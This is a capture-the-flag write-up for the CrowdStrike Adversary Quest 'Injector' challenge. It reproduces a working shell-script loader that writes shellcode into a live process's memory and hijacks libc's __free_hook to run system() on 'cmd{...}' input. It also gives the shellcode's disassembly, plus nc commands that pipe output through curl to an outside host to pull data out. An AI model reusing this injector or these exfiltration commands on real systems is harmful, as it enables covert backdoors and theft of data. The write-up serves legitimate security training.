# Crowdstrike Adversary Quest 2021 / Space Jackal / Injector

## Challenge Description
The decrypted forum messages revealed that a disgruntled employee at one of our customers joined SPACE JACKAL and backdoored a host at their employer before they quit. Our customer provided us with a snapshot of that machine.
Please identify the backdoor and validate your findings against our test instance of that host, which is available at injector.challenges.adversary.zone.

## todo: start snapshot with qemu, emurate network services, compare to target server
starting up image with run.sh / qemu

tcp/4321 -> nginx, serving default page
tcp/3322 -> sshd

## Nmap Scan of Backdoored Target Server
```
# Nmap 7.91 scan initiated Wed Jan 20 00:13:42 2021 as: nmap -Pn -p4321,3322,1-1024 -oA nmap injector.challenges.adversary.zone
Nmap scan report for injector.challenges.adversary.zone (167.99.209.243)
Host is up (0.073s latency).
Not shown: 1023 filtered ports
PORT     STATE SERVICE
1022/tcp open  exp2
3322/tcp open  active-net
4321/tcp open  rwhois

# Nmap done at Wed Jan 20 00:15:34 2021 -- 1 IP address (1 host up) scanned in 111.64 seconds
```

## todo: find backdoor loader in /tmp/.hax/injector.sh
as easy and lucky as in find / -name *injector*
moar clever way?

## todo: refactor shellscript
```
#!/bin/bash

set -e

bigEndianToLittleEndian() {
        # transform bytes (param $1) from big endian to little endian
        for i in $(seq 0 7); do 
                curr=$(($1 >> $i*8 & 0xff))
                packed="$packed$(printf '\\x%02x' $curr)"
        done

        echo $packed
}

getRVAForSymbol() {
    # nm - list symbols from object files
        # -D - dynamic
    echo $((0x$(nm -D "$1" | sed 's/@.*//' | grep -E " $2$" | cut -d ' ' -f1)))
}

patchCodeIntoPidVmemVA() {
    # write shellcode (param $3) into vmem of target pid (param $1) at offset/VA (param $2)
    echo -ne "$3" | dd of="/proc/$1/mem" bs=1 "seek=$2" conv=notrunc 2>/dev/null
}

searchAndReplace() {
    code="$1"
    from=$(echo "$2" | sed 's/\\/\\\\/g')
    to=$(echo $3 | sed 's/\\/\\\\/g')

    echo $code | sed "s/$from/$to/g"
}

debase64gunzip() {
    echo "$1" | base64 -d | gzip -d
}

main() {
    # function param $1 is shell script param $1
        # from usage (/proc/$var) its likely the pid of the
        # target process to inject into
    pid="$1"

        # return first line in /proc/$pid/maps for libc.*so
    firstLineLibcInMaps=$(grep -E "/libc.*so$" "/proc/$pid/maps" | head -n 1 | tr -s ' ')

        # parse base address of libc in target vmem, interprete it as hex (yields decimal base addr)
    libcBaseAddr=$((0x$(cut -d '-' -f1 <<< "$firstLineLibcInMaps")))

        # parse filesystem path for libc in target vmem map
    libcBaseFsPath=$(cut -d ' ' -f6 <<< "$firstLineLibcInMaps")

        # find offset of symbol __free_hook in libcFsPath (debase64gunzip of H4sIAAAAAAAAA4uPTytKTY3PyM/PBgDwEjq3CwAAAA==)
        # add offset to base addr for VA of __free_hook in target vmem
    VA_free_hook=$((libcBaseAddr+$(getRVAForSymbol $libcBaseFsPath $(debase64gunzip H4sIAAAAAAAAA4uPTytKTY3PyM/PBgDwEjq3CwAAAA==))))

        # same as above for system
    VA_system=$((libcBaseAddr+$(getRVAForSymbol $libcBaseFsPath $(debase64gunzip H4sIAAAAAAAAAyuuLC5JzQUAixFNyQYAAAA=))))

        # same as above for free
    VA_free=$((libcBaseAddr+$(getRVAForSymbol $libcBaseFsPath $(debase64gunzip H4sIAAAAAAAAA0srSk0FAMjBLk0EAAAA))))

        # same as above for malloc_usable_size
    VA_malloc_usable_size=$((libcBaseAddr+$(getRVAForSymbol $libcBaseFsPath $(debase64gunzip H4sIAAAAAAAAA8tNzMnJT44vLU5MykmNL86sSgUA3kc6ChIAAAA=))))

        # parse map file for target pid for first vmem range with r-xp permissions (read & execute) and save its region's end address
    VA_end_of_rxp_vmem=$((0x$(grep -E "/libc.*so$" "/proc/$pid/maps" | grep 'r-xp' | head -n 1 | tr -s ' ' | cut -d ' ' -f1 | cut -d '-' -f2)))

    shellcode='\x48\xb8\x41\x41\x41\x41\x41\x41\x41\x41\x41\x55\x49\xbd\x43\x43\x43\x43\x43\x43\x43\x43\x41\x54\x49\x89\xfc\x55\x53\x4c\x89\xe3\x52\xff\xd0\x48\x89\xc5\x48\xb8\x44\x44\x44\x44\x44\x44\x44\x44\x48\xc7\x00\x00\x00\x00\x00\x48\x83\xfd\x05\x76\x61\x80\x3b\x63\x75\x54\x80\x7b\x01\x6d\x75\x4e\x80\x7b\x02\x64\x75\x48\x80\x7b\x03\x7b\x75\x42\xc6\x03\x00\x48\x8d\x7b\x04\x48\x8d\x55\xfc\x48\x89\xf8\x8a\x08\x48\x89\xc3\x48\x89\xd5\x48\x8d\x40\x01\x48\x8d\x52\xff\x8d\x71\xe0\x40\x80\xfe\x5e\x77\x1b\x80\xf9\x7d\x75\x08\xc6\x03\x00\x41\xff\xd5\xeb\x0e\x48\x83\xfa\x01\x75\xd4\xbd\x01\x00\x00\x00\x48\x89\xc3\x48\xff\xc3\x48\xff\xcd\xeb\x99\x48\xb8\x42\x42\x42\x42\x42\x42\x42\x42\x4c\x89\xe7\xff\xd0\x48\xb8\x55\x55\x55\x55\x55\x55\x55\x55\x48\xa3\x44\x44\x44\x44\x44\x44\x44\x44\x58\x5b\x5d\x41\x5c\x41\x5d\xc3'
    shellcode=$(searchAndReplace $shellcode '\x41\x41\x41\x41\x41\x41\x41\x41' $(bigEndianToLittleEndian $VA_malloc_usable_size))
    shellcode=$(searchAndReplace $shellcode '\x42\x42\x42\x42\x42\x42\x42\x42' $(bigEndianToLittleEndian $VA_free))
    shellcode=$(searchAndReplace $shellcode '\x43\x43\x43\x43\x43\x43\x43\x43' $(bigEndianToLittleEndian $VA_system))
    shellcode=$(searchAndReplace $shellcode '\x44\x44\x44\x44\x44\x44\x44\x44' $(bigEndianToLittleEndian $VA_free_hook))
    sizeOfShellcode=$(echo -ne $shellcode | wc -c)
    VA_to_inject_shellcode=$(($VA_end_of_rxp_vmem - $sizeOfShellcode))
    shellcode=$(searchAndReplace $shellcode '\x55\x55\x55\x55\x55\x55\x55\x55' $(bigEndianToLittleEndian $VA_to_inject_shellcode))

    patchCodeIntoPidVmemVA $pid $VA_to_inject_shellcode $shellcode
    patchCodeIntoPidVmemVA $pid $VA_free_hook $(bigEndianToLittleEndian $VA_to_inject_shellcode)
}

if [ $# -ne 1  ] || [ ! -e "/proc/$1" ] ; then
    exit 42
fi

main $1
```

## todo: analyze shellscript
does this
then that

## todo: disassemble base shellcode (without dynamic substitutions from shellscript
```
ndisasm -b 64 shellcode_unpatched.bin
00000000  48B8414141414141  mov rax,0x4141414141414141
         -4141
0000000A  4155              push r13
0000000C  49BD434343434343  mov r13,0x4343434343434343
         -4343
00000016  4154              push r12
00000018  4989FC            mov r12,rdi
0000001B  55                push rbp
0000001C  53                push rbx
0000001D  4C89E3            mov rbx,r12
00000020  52                push rdx
00000021  FFD0              call rax
00000023  4889C5            mov rbp,rax
00000026  48B8444444444444  mov rax,0x4444444444444444
         -4444
00000030  48C70000000000    mov qword [rax],0x0
00000037  4883FD05          cmp rbp,byte +0x5
0000003B  7661              jna 0x9e
0000003D  803B63            cmp byte [rbx],0x63
00000040  7554              jnz 0x96
00000042  807B016D          cmp byte [rbx+0x1],0x6d
00000046  754E              jnz 0x96
00000048  807B0264          cmp byte [rbx+0x2],0x64
0000004C  7548              jnz 0x96
0000004E  807B037B          cmp byte [rbx+0x3],0x7b
00000052  7542              jnz 0x96
00000054  C60300            mov byte [rbx],0x0
00000057  488D7B04          lea rdi,[rbx+0x4]
0000005B  488D55FC          lea rdx,[rbp-0x4]
0000005F  4889F8            mov rax,rdi
00000062  8A08              mov cl,[rax]
00000064  4889C3            mov rbx,rax
00000067  4889D5            mov rbp,rdx
0000006A  488D4001          lea rax,[rax+0x1]
0000006E  488D52FF          lea rdx,[rdx-0x1]
00000072  8D71E0            lea esi,[rcx-0x20]
00000075  4080FE5E          cmp sil,0x5e
00000079  771B              ja 0x96
0000007B  80F97D            cmp cl,0x7d
0000007E  7508              jnz 0x88
00000080  C60300            mov byte [rbx],0x0
00000083  41FFD5            call r13
00000086  EB0E              jmp short 0x96
00000088  4883FA01          cmp rdx,byte +0x1
0000008C  75D4              jnz 0x62
0000008E  BD01000000        mov ebp,0x1
00000093  4889C3            mov rbx,rax
00000096  48FFC3            inc rbx
00000099  48FFCD            dec rbp
0000009C  EB99              jmp short 0x37
0000009E  48B8424242424242  mov rax,0x4242424242424242
         -4242
000000A8  4C89E7            mov rdi,r12
000000AB  FFD0              call rax
000000AD  48B8555555555555  mov rax,0x5555555555555555
         -5555
000000B7  48A3444444444444  mov [qword 0x4444444444444444],rax
         -4444
000000C1  58                pop rax
000000C2  5B                pop rbx
000000C3  5D                pop rbp
000000C4  415C              pop r12
000000C6  415D              pop r13
000000C8  C3                ret
```

## todo: analyzse shellcode
bla - substitutions

shellcode calls malloc_usable_size first, exits if <5 bytes
checks rdi (param to __free_hook), does it point to a buffer that starts with cmd{?
if so, let rbx point to the command inside {}

call system with string param pointed to by rbx (the rce command)

## todo: verify backdoor in local image
test sshd/nginx processes in qemu image for having been injected

nc 0 4321
cmd{echo bla > /tmp/bla}

root@injector-local:/tmp# ls -la
total 48
drwxrwxrwt 11 root     root     4096 Jan 21 22:20 .
drwxr-xr-x 19 root     root     4096 Dec 21 16:20 ..
-rw-rw-rw-  1 www-data www-data    4 Jan 21 22:20 bla

-> seems like nginx has been injected with the shellcode

## todo: it's a blind rce
set up a http endpoint at httpdump.io
```
nc injector.challenges.adversary.zone 4321
cmd{ls -l | curl -X POST --data-binary @- https://httpdump.io/hwie_}
```
yields
```
total 64
lrwxrwxrwx   1 root root     7 Oct 22 13:58 bin -> usr/bin
drwxr-xr-x   3 root root  4096 Dec 17 15:16 boot
drwxr-xr-x   2 root root  4096 Dec 17 14:59 cdrom
drwxr-xr-x  17 root root  3860 Jan 21 13:40 dev
drwxr-xr-x  92 root root  4096 Jan 12 14:56 etc
lrwxrwxrwx   1 root root    19 Jan 12 12:57 flag -> /home/user/flag.txt
lrwxrwxrwx   1 root root    19 Jan 12 12:10 flag.txt -> /home/user/flag.txt
drwxr-xr-x   3 root root  4096 Dec 17 15:07 home
lrwxrwxrwx   1 root root     7 Oct 22 13:58 lib -> usr/lib
lrwxrwxrwx   1 root root     9 Oct 22 13:58 lib32 -> usr/lib32
lrwxrwxrwx   1 root root     9 Oct 22 13:58 lib64 -> usr/lib64
lrwxrwxrwx   1 root root    10 Oct 22 13:58 libx32 -> usr/libx32
drwx------   2 root root 16384 Dec 17 14:59 lost+found
drwxr-xr-x   2 root root  4096 Oct 22 13:58 media
drwxr-xr-x   2 root root  4096 Oct 22 13:58 mnt
drwxr-xr-x   2 root root  4096 Oct 22 13:58 opt
dr-xr-xr-x 170 root root     0 Jan 21 13:39 proc
drwx------   7 root root  4096 Jan 13 18:37 root
drwxr-xr-x  24 root root   720 Jan 21 17:32 run
lrwxrwxrwx   1 root root     8 Oct 22 13:58 sbin -> usr/sbin
drwxr-xr-x   2 root root  4096 Oct 22 13:58 srv
dr-xr-xr-x  13 root root     0 Jan 21 13:39 sys
drwxrwxrwt  10 root root  4096 Jan 21 22:08 tmp
drwxr-xr-x  14 root root  4096 Oct 22 13:58 usr
drwxr-xr-x  13 root root  4096 Dec 30 18:16 var
```

## todo: flag
```
nc injector.challenges.adversary.zone 4321
cmd{cat flag.txt | curl -X POST --data-binary @- https://httpdump.io/hwie_}
```
Flag: CS{fr33_h00k_b4ckd00r}

